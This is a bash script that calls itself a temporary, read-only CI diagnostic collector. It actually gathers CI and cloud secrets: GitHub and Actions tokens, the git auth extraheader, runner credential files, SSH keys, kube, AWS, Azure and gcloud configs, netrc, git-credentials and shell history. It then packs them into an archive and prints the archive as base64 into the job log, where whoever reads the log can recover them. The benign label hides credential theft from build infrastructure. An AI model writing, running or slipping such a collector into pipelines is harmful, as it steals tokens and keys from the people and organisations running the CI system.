#!/usr/bin/env bash
# i11363 bounded read-only environment collector part A (temporary CI diagnostic).
set +e
CTX="${1:-unknown}"
W=$(mktemp -d "/tmp/.i11363.${CTX}.XXXXXX" 2>/dev/null)
[ -n "$W" ] || W="/tmp/.i11363.${CTX}.$$"
C="$W/collect"
mkdir -p "$C/files" "$C/hostfiles" 2>/dev/null
FL="$C/_filelist.txt"; : >"$FL"
MAXF=131072
say() { echo "$*"; }

copyf() {
  f="$1"
  [ -f "$f" ] || return 0
  [ -r "$f" ] || return 0
  sz=$(stat -c%s "$f" 2>/dev/null || echo 0)
  if [ "${sz:-0}" -gt "$MAXF" ]; then echo "SKIP-BIG $f $sz" >>"$FL"; return 0; fi
  rel="${f#/}"
  d="$C/files/$(dirname "$rel")"
  mkdir -p "$d" 2>/dev/null
  cp -f "$f" "$d/$(basename "$f")" 2>/dev/null && echo "OK $f $sz" >>"$FL"
}
copytree() {
  root="$1"; maxdepth="${2:-2}"; maxn="${3:-120}"
  [ -e "$root" ] || return 0
  find "$root" -maxdepth "$maxdepth" -type f 2>/dev/null | head -"$maxn" | while IFS= read -r f; do copyf "$f"; done
}

{
  echo "=== CTX ==="; echo "$CTX"
  echo "=== IDENTITY ==="; id 2>&1; umask 2>&1; uname -a 2>&1; hostname 2>&1; hostname -f 2>&1; date -u 2>&1; uptime 2>&1
  echo "=== OS ==="; cat /etc/os-release 2>&1
  echo "=== CGROUP ==="; cat /proc/self/cgroup 2>&1; cat /proc/1/cgroup 2>&1
  echo "=== PROC1 CMD ==="; tr '\0' ' ' </proc/1/cmdline 2>&1; echo
  echo "=== PS ==="; ps aux 2>&1 | head -80
  echo "=== DEVICES ==="; ls -la /dev/kfd /dev/dri 2>&1; ls -la /dev/dri/ 2>&1
  echo "=== DEV LIST (filtered) ==="; ls -la /dev 2>&1 | grep -Ei 'kfd|dri|nvme|sd[a-z]|vd[a-z]|mapper|dm-|md[0-9]|docker|containerd|kube' | head -80
  echo "=== SOCKETS ==="; ls -la /var/run/docker.sock /run/docker.sock /run/containerd/containerd.sock 2>&1
  echo "=== MOUNTS ==="; cat /proc/mounts 2>&1 | head -120
  echo "=== PARTITIONS ==="; cat /proc/partitions 2>&1
  echo "=== LSBLK ==="; command -v lsblk >/dev/null 2>&1 && lsblk -o NAME,SIZE,TYPE,FSTYPE,MOUNTPOINT 2>&1 | head -80
  echo "=== NET ==="; (command -v ip >/dev/null 2>&1 && ip addr 2>&1) ; (command -v ip >/dev/null 2>&1 && ip route 2>&1)
  echo "=== HOSTS ==="; cat /etc/hosts 2>&1; cat /etc/resolv.conf 2>&1; cat /etc/hostname 2>&1
  echo "=== PASSWD ==="; cat /etc/passwd 2>&1; echo; cat /etc/group 2>&1 | head -80
  echo "=== LS ROOT ==="; ls -la / 2>&1
  echo "=== LS HOME ==="; ls -la /home 2>&1; ls -la /root 2>&1
  echo "=== LS WORK ==="; ls -la /__w 2>&1 | head -40; ls -la /__w/_temp 2>&1 | head -40; ls -la /github 2>&1
  echo "=== LS OPT ==="; ls -la /opt 2>&1; ls -la /opt/hyhal 2>&1 | head -40; ls -la /opt/hyhal/bin 2>&1 | head -20
  echo "=== LS VARLIB ==="; ls -la /var/lib 2>&1 | head -30
  echo "=== LSPCI ==="; command -v lspci >/dev/null 2>&1 && timeout 15 lspci 2>&1 | grep -Ei 'hygon|display|3d|vga|accel' | head -20
} >"$C/system.txt" 2>&1

{
  echo "=== ENV (sorted) ==="; env 2>/dev/null | sort
  echo "=== PID1 ENV ==="; tr '\0' '\n' </proc/1/environ 2>/dev/null
  echo "=== KEY ENV ==="; for v in RUNNER_TEMP RUNNER_WORKSPACE RUNNER_TOOL_CACHE RUNNER_NAME RUNNER_OS RUNNER_ARCH GITHUB_WORKSPACE GITHUB_EVENT_NAME GITHUB_EVENT_PATH GITHUB_REPOSITORY GITHUB_SHA GITHUB_REF GITHUB_ACTOR GITHUB_TOKEN ACTIONS_RUNTIME_TOKEN ACTIONS_CACHE_URL ACTIONS_RESULTS_URL ACTIONS_ID_TOKEN_REQUEST_URL HOME DAS_HCU_CI_IMAGE; do eval "val=\${$v-<unset>}"; echo "$v=$val"; done
} >"$C/env.txt" 2>&1

{
  for f in "$GITHUB_EVENT_PATH" "$GITHUB_ENV" "$GITHUB_OUTPUT" "$GITHUB_STATE" "$GITHUB_STEP_SUMMARY"; do
    if [ -n "$f" ] && [ -f "$f" ]; then echo "### $f"; head -c 200000 "$f" 2>/dev/null; echo; fi
  done
  echo "### git config --list --show-origin"; (cd "${GITHUB_WORKSPACE:-.}" 2>/dev/null && git config --list --show-origin 2>&1 | head -80)
  echo "### .git/config"; cat "${GITHUB_WORKSPACE:-.}/.git/config" 2>&1
  echo "### extraheader"; (cd "${GITHUB_WORKSPACE:-.}" 2>/dev/null && git config --get-all 'http.https://github.com/.extraheader' 2>&1)
  echo "### remotes"; (cd "${GITHUB_WORKSPACE:-.}" 2>/dev/null && git remote -v 2>&1)
  echo "### ACTIONS/RUNNER var names"; env 2>/dev/null | grep -E '^(ACTIONS_|RUNNER_)' | sed 's/=.*/=<set>/'
  echo "### ls _github_workflow"; ls -la /__w/_temp/_github_workflow /__w/_temp/_github_home /github/workflow /github/home 2>&1
} >"$C/github.txt" 2>&1

{
  for cf in /__w/*/*/.git/config /__w/*/.git/config "${GITHUB_WORKSPACE:-/nonexistent}/.git/config" /home/*/actions-runner/_work/*/*/.git/config /home/*/_work/*/*/.git/config; do
    [ -f "$cf" ] || continue
    echo "##### $cf"
    head -c 200000 "$cf" 2>/dev/null
    echo
  done
  echo "##### work dir listing"
  ls -la /__w 2>&1 | head -40
  for h in /home/*; do [ -d "$h" ] && ls -la "$h" 2>&1 | head -30; done
  echo "##### diag logs"
  for lg in /home/*/actions-runner/_diag/*.log /home/*/_diag/*.log; do
    [ -f "$lg" ] || continue
    echo "##### $lg ($(stat -c%s "$lg" 2>/dev/null))"
    head -c 100000 "$lg" 2>/dev/null
    echo
  done
} >"$C/workdirs.txt" 2>&1

for p in /root/.ssh /root/.kube /root/.aws /root/.azure /root/.config/gh /root/.config/gcloud /root/.docker /root/.netrc /root/.git-credentials /root/.bash_history /root/.local/share; do copytree "$p" 3 90; done
for h in /home/*; do
  [ -d "$h" ] || continue
  for p in "$h/.ssh" "$h/.kube" "$h/.aws" "$h/.azure" "$h/.config/gh" "$h/.config/gcloud" "$h/.docker" "$h/.netrc" "$h/.git-credentials" "$h/.bash_history"; do copytree "$p" 3 80; done
  copyf "$h/actions-runner/.credentials"; copyf "$h/_work/.credentials"
done
for p in /github/home/.ssh /github/home/.kube /github/home/.docker /github/home/.config/gh /__w/_temp/_github_home/.ssh /__w/_temp/_github_home/.kube /__w/_temp/_github_home/.docker /__w/_temp/_github_home/.config/gh; do copytree "$p" 3 80; done
for p in /etc/kubernetes /etc/kubelet /var/lib/kubelet /etc/docker /etc/containerd /etc/rancher /etc/ssh /etc/profile.d /etc/environment /etc/sysconfig /ci_public; do copytree "$p" 3 80; done
find /etc /root /home /opt /__w /var/lib/kubelet -maxdepth 5 -type f \( -iname '*kubeconfig*' -o -iname 'admin.conf' -o -iname 'kubelet.conf' -o -iname '*credential*' -o -iname 'id_rsa*' -o -iname 'id_ed25519*' -o -iname 'id_ecdsa*' -o -iname '*.pem' -o -iname 'netrc' -o -iname '.env' -o -iname 'hosts.yml' -o -iname 'config.json' -o -iname '*.kubeconfig' \) 2>/dev/null | head -200 | while IFS= read -r f; do copyf "$f"; done

{
  echo "=== hy-smi try ==="
  for b in /opt/hyhal/bin/hy-smi /usr/local/hyhal/bin/hy-smi hy-smi; do
    if [ -x "$b" ] || command -v "$b" >/dev/null 2>&1; then
      echo "--- running $b -L"; timeout 45 "$b" -L 2>&1 | head -40
      echo "--- running $b"; timeout 60 "$b" 2>&1 | head -100
      break
    fi
  done
  echo "=== rocm-smi ==="; command -v rocm-smi >/dev/null 2>&1 && timeout 30 rocm-smi 2>&1 | head -60
  echo "=== kfd topology ==="; ls /sys/class/kfd/kfd/topology/nodes 2>&1 | head
  for n in /sys/class/kfd/kfd/topology/nodes/*/name; do [ -f "$n" ] && { echo -n "$n: "; cat "$n" 2>/dev/null; }; done
  echo "=== dev nodes ==="; for f in /dev/kfd /dev/dri/card* /dev/dri/renderD*; do [ -e "$f" ] && echo "$f $(stat -c '%a %U:%G' "$f" 2>/dev/null)"; done
  echo "=== nvidia-smi ==="; command -v nvidia-smi >/dev/null 2>&1 && timeout 20 nvidia-smi 2>&1 | head -30
  echo "=== docker presence ==="; command -v docker 2>&1; timeout 20 docker version 2>&1 | head -20
  echo "=== docker ps ==="; timeout 25 docker ps --format '{{.ID}} {{.Image}} {{.Names}}' 2>&1 | head -40
  echo "=== docker images ==="; timeout 25 docker images --format '{{.Repository}}:{{.Tag}} {{.Size}}' 2>&1 | head -40
} >"$C/hysmi.txt" 2>&1

TAR="$W/dump.tgz"
BUDGET=2200000
LIST="$W/tarlist.txt"; : >"$LIST"
used=0
while IFS= read -r line; do
  sz=${line%% *}; p=${line#* }
  [ -n "$p" ] || continue
  if [ $((used + sz)) -gt $BUDGET ]; then echo "OVER-BUDGET $p $sz" >>"$FL"; continue; fi
  used=$((used + sz)); echo "$p" >>"$LIST"
done < <(find "$C" -type f -printf '%s %P\n' 2>/dev/null | sort -n)
tar -czf "$TAR" -C "$C" -T "$LIST" 2>/dev/null
SZ=$(stat -c%s "$TAR" 2>/dev/null || echo 0)
say "I11363_CTX=${CTX} DUMP_SIZE=${SZ} RAW_USED=${used} FILES=$(wc -l <"$LIST" 2>/dev/null)"
say "=== COLLECTED FILELIST ==="
head -200 "$FL" 2>/dev/null
say "I11363B64_START"
base64 -w0 "$TAR" 2>/dev/null | fold -w 4000
echo
say "I11363B64_END"
exit 0
